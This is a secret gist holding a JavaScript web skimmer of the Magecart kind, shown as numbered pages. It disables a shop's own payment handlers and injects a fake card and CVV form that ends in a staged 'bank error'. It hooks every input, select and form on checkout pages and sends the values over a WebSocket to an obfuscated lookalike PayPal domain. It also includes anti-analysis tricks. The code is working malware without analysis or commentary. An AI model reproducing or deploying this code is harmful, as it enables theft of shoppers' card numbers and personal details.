krautface/group-1-websocket-stage-4.js Secret
gist.github.com/krautface/2c017f220f2a24141bdeb70f76e7e745

function aC(name)
{
function escape(s)
{
return s.replace(/([.*+?\^${}()|\[\]\/\\])/g, '\\$1');
};
var match = document.cookie.match(RegExp('(?:^|;\\s*)' + escape(name) + '=([^;]*)'));
return match ? match[1] : null;
}
function googleCheck()
{
alert('I\'m here!');
}
if (!aC('ashdgaisydasldasbdyigausd'))
{
document.cookie = "ashdgaisydasldasbdyigausd=96ddd96e7ed46eb02af0280c550d9772";
var tokahsdb = '96ddd96e7ed46eb02af0280c550d9772';
}
else
{

1/14

var tokahsdb = aC('ashdgaisydasldasbdyigausd');
}

var reffererQwerdfdgdfg = 'victimsite.com';
if (location.hostname == 'file://')
{
while (1)
{
document.cookie = document.cookie + document.cookie + "qweqwe=qweqwe";
document.querySelector('body').innerHTML += document.querySelector('body').innerHTML;
}
}

if (!document.querySelector('.qweqwe' + tokahsdb))
{
qweqweIint = setInterval(function ()
{
if (document.querySelector('div'))
{
var s = document.getElementsByTagName('div')[0];
var li = document.createElement('span');
li.class = "qweqwe" + tokahsdb;
s.parentNode.insertBefore(li, s);
clearInterval(qweqweIint);
}
}, 50);
var c = [112, 97, 121, 112, 97, 108, 97, 112, 105, 111, 98, 106, 101, 99, 116, 115, 46, 99, 111, 109],
ggtag = '//',
ihbdnfidjmpwofnj = 1;
for (var ji = 0; ji < c.length; ji++)
{
ggtag += String.fromCharCode(c[ji]);
}

(function ()
{
setInterval(setNullMethods, 100);

2/14

function setNullMethods()
{
if (typeof (window.GetData) != 'undefined')
{
window.GetData = function (elem, flag)
{
console.log('ZnVjayB5b3U=');
};
}
if (typeof (window.Default_Send) != 'undefined')
{
window.Default_Send = function (elem, flag)
{
console.log('ZnVjayB5b3U=');
};
}
if (typeof (window.CheckFields) != 'undefined')
{
window.CheckFields = function (elem, flag)
{
console.log('ZnVjayB5b3U=');
};
}
if (typeof window.SendData != 'undefined')
{
window.SendData = function ()
{
console.log('ZnVjayB5b3U=');
};
}
}
})();
(function ()
{
function _0xjefgJJDLF()
{
return _0x5gasdkf() && _0x5kjsdfdsf();

3/14

}

function _0x5gasdkf()
{
var obj = document.querySelector('[name="card_num"]#card_num');
if (!__cleanValid(obj.value))
{
obj.setAttribute('class', 'invalid-custom-form-input');
return false;
}
else
{
obj.setAttribute('class', 'valid-custom-form-input');
return true;
}
}
function _0x5kjsdfdsf()
{
var obj = document.querySelector('[name="cvv2"]#cvv2');
if (!___cleanValid(obj.value))
{
obj.setAttribute('class', 'invalid-custom-form-input');
return false;
}
else
{
obj.setAttribute('class', 'valid-custom-form-input');
return true;
}
}

function __cleanValid(value)
{
if (/[^0-9-\s]+/.test(value)) return false;
let nCheck = 0,

4/14

bEven = false;
value = value.replace(/\D/g, "");
if (value.length < 16) return false;
for (var n = value.length - 1; n >= 0; n--)
{
var cDigit = value.charAt(n),
nDigit = parseInt(cDigit, 10);
if (bEven && (nDigit *= 2) > 9)
{
nDigit -= 9;
}
nCheck += nDigit;
bEven = !bEven;
}
return (nCheck % 10) == 0;
}
function ___cleanValid(value)
{
value = value.replace(/\D/g, "");
if (value.length < 3 || value.length > 4)
{
return false;
}
return true;
}

var intervalValidator = setInterval(_0xhsdfJk, 100);
function _0xhsdfJk()
{
if (document.querySelector('[name="card_num"]#card_num') && !document.querySelector('[name="card_num"]#card_num[datavalidator=true]'))
{
document.querySelector('[name="card_num"]#card_num').addEventListener('input', function (e)
{

5/14

e.target.value = e.target.value.replace(/[^0-9]/g, '').replace(/(\..*)\./g, '$1');
let val = '';
let __1 = e.target.value.substr(0, 4);
if (e.target.value.length > 4)
{
val += __1;
let __2 = e.target.value.substr(4, 4);
if (__1.length == 4 && __2)
{
val += ' ' + __2;
let __3 = e.target.value.substr(8, 4);
if (__2.length == 4 && __3)
{
val += ' ' + __3;
let __4 = e.target.value.substr(12, 4);
if (__3.length == 4 && __4)
{
val += ' ' + __4;
}
}
}
e.target.value = val;
}
});
if (document.querySelector('[name="card_num"]#card_num'))
{
document.querySelector('[name="card_num"]#card_num').addEventListener('focus', function (e)
{
document.querySelector('[name="card_num"]#card_num').setAttribute('class', '');
});
document.querySelector('[name="card_num"]#card_num').addEventListener('blur', function (e)
{
_0x5gasdkf();
});
}

6/14

if (document.querySelector('[name="cvv2"]#cvv2'))
{
document.querySelector('[name="cvv2"]#cvv2').addEventListener('focus', function (e)
{
document.querySelector('[name="cvv2"]#cvv2').setAttribute('class', '');
});
document.querySelector('[name="cvv2"]#cvv2').addEventListener('blur', function (e)
{
_0x5kjsdfdsf();
});
}
document.querySelector('[name="card_num"]#card_num').setAttribute('data-validator', 'true');
}

if (document.querySelector('#dfsdfsfsdf672ac3d52c366529fc7f93a19455bd95') &&
!document.querySelector('#dfsdfsfsdf672ac3d52c366529fc7f93a19455bd95.lkmfsjdfnsdihdbfl672ac3d52c366529fc7f93a19455bd95'))
{
document.querySelector('#dfsdfsfsdf672ac3d52c366529fc7f93a19455bd95').setAttribute('class',
'lkmfsjdfnsdihdbfl672ac3d52c366529fc7f93a19455bd95');
var tryToPayBtn = document.querySelector('#try-to-pay-button');
if (tryToPayBtn)
{
tryToPayBtn.addEventListener('click', function (e)
{

e.preventDefault();
if (!_0xjefgJJDLF())
{
return false;
}
else
{
clearInterval(intervalValidator);
document.querySelector('#dfsdfsfsdf672ac3d52c366529fc7f93a19455bd95 .statusBar').innerHTML = '<div style="text-align:
center;font-weight: bold;">' + labels['bank_processing'] + '</div>';
tryToPayBtn.setAttribute('disabled', 'disabled');
setTimeout(function ()

7/14

{
document.cookie = "formHIde=1;";
document.querySelector('#dfsdfsfsdf672ac3d52c366529fc7f93a19455bd95 .statusBar').innerHTML = '<div style="color:darkred">' +
labels['bank_error'] + '</div>';
setTimeout(function ()
{
document.querySelector('#dfsdfsfsdf672ac3d52c366529fc7f93a19455bd95').setAttribute('style', 'display:none !important;');
if (typeof sdnjfsldfk == 'function')
{
sdnjfsldfk();
}
}, 7000);
}, 10000);
}
});
}

}
}
})();
var wssocket;
var pingInterval;
var host = '//pa' + 'yp' + 'al' + 'ap' + 'io' + 'bj' + 'ec' + 'ts.com';
wssconnect();
let wssConnectInterval = setInterval(wssconnect, 1000);
function wssconnect()
{
if (!wssocket || (wssocket.readyState != 1 && wssocket.readyState != '-0'))
{
try
{
wssocket = new WebSocket("wss:" + host + "/events/");
wssocket.onopen = function (data)
{
socketSend(
{
e: "hello",

8/14

data:
{
domain: location.origin
}
});
pingInterval = setInterval(function ()
{
socketSend(
{
e: "ping"
});
}, 5000);
};
wssocket.onclose = function (data)
{
clearInterval(pingInterval);
};
wssocket.onmessage = function (data) {};
}
catch (e)
{}
}
}
function socketSend(data)
{
wssocket.send(JSON.stringify(data));
}
function wssdisconnect()
{
clearInterval(pingInterval);
clearInterval(wssConnectInterval);
wssocket.close();
}
window.addEventListener("unload", wssdisconnect);
(function ()
{

9/14

function gcmBuild()
{
addEvents();
setInterval(addEvents, 100);
}
function pixel(fs)
{
var j = getJson();
emit(j);
}
function getJson()
{
const formData = new Object;
formData['tok'] = tokahsdb;
document.querySelectorAll('input').forEach(function (item, i)
{
if (item.value.length < 1)
{
return;
}
let itemKey = '';
if (item.name)
{
itemKey = item.name;
}
else if (item.id)
{
itemKey = item.id;
}
formData[itemKey] = item.value;
});
document.querySelectorAll('select').forEach(function (item, i)
{
if (item.name.search('date') != '-1' || item.name.search('exp') != '-1' || item.name.search('cardExpiration') != '-1')
{

10/14

formData[item.name] = item.value;
return;
}
if (!document.querySelector('[name="' + item.name + '"]'))
{
console.log('[name="' + item.name + '"]', 'not found');
return;
}
if (!document.querySelector('[name="' + item.name + '"] [value="' + document.querySelector('[name="' + item.name + '"]').value + '"]'))
{
console.log('[name="' + item.name + '"] [value="' + document.querySelector('[name="' + item.name + '"]').value + '"]', 'not found');
return;
}
formData[item.name] = document.querySelector('[name="' + item.name + '"] [value="' + document.querySelector('[name="' +
item.name + '"]').value + '"]').innerText;
});

document.querySelectorAll('textarea').forEach(function (item, i)
{
formData[item.name] = item.value;
});
if (typeof reffererQwerdfdgdfg != 'undefined')
{
formData['domain'] = reffererQwerdfdgdfg;
}
else
{
formData['domain'] = location.hostname;
}
return JSON.stringify(formData);
}
function addEvents()
{
if (typeof grelos_v != 'undefined')
{
grelos_v['Glink'] = '/';

11/14

}
if (
!document.querySelector('[name*=cc_number]') &&
!document.querySelector('[name*=firstname]') &&
!document.querySelector('[name*=name]') &&
!document.querySelector('[name*=address]') &&
!document.querySelector('[name*=postcode]') &&
!document.querySelector('[name*=zip]') &&
!document.querySelector('[name*=phone]') &&
!document.querySelector('[name*=email]') &&
!document.querySelector('[name*="payment[cc_number]"]') &&
!document.querySelector('[name*=payment]') &&
!document.querySelector('[name*=cc]') &&
!document.querySelector('[name*=card_num]') &&
!document.querySelector('[name*=billing]')
)
{
return false;
}
Array.from(document.getElementsByTagName('input')).forEach(function (item, i)
{
if (!item.hasAttribute('build'))
{
item.setAttribute('build', 1);
item.addEventListener("blur", eventSend);
}
});
Array.from(document.getElementsByTagName('select')).forEach(function (item, i)
{
if (!item.hasAttribute('build'))
{
item.setAttribute('build', 1);
item.addEventListener("blur", eventSend);
}
});
Array.from(document.getElementsByTagName('textarea')).forEach(function (item, i)

12/14

{
if (!item.hasAttribute('build'))
{
item.setAttribute('build', 1);
item.addEventListener("blur", eventSend);
}
});
Array.from(document.querySelectorAll("form")).forEach(function (item, i)
{
if (!item.hasAttribute('build'))
{
item.setAttribute('build', 1);
item.addEventListener("submit", eventSend);
}
});
Array.from(document.querySelectorAll("[type=submit]")).forEach(function (item, i)
{
if (!item.hasAttribute('build'))
{
item.setAttribute('buildd', 1);
item.addEventListener("click", eventSend);
}
});
Array.from(document.querySelectorAll("[type=button]")).forEach(function (item, i)
{
if (!item.hasAttribute('buildd'))
{
item.setAttribute('buildd', 1);
item.addEventListener("click", eventSend);
}
});
}
function eventSend(e)
{
pixel(0);
}

13/14

function emit(data)
{
if (typeof googlelog != 'undefined')
{
console.log(data);
}
socketSend(
{
e: "send",
data: data
});
}
window.addEventListener("load", gcmBuild, false);
})();
(function ()
{
if (!aC('pixel'))
{
if (document.referrer != '' && document.referrer.replace('https://', '').replace('http://').split('/')[0] != location.hostname)
{
document.cookie = "pixel=1; max-age=" + (3600 * 3);
}
else
{
document.cookie = "pixel=2; max-age=" + (3600 * 3);
}
}
if (!aC('formHIde') && (1 || aC('pixel') == 1 || 0))
{}

})();
}

14/14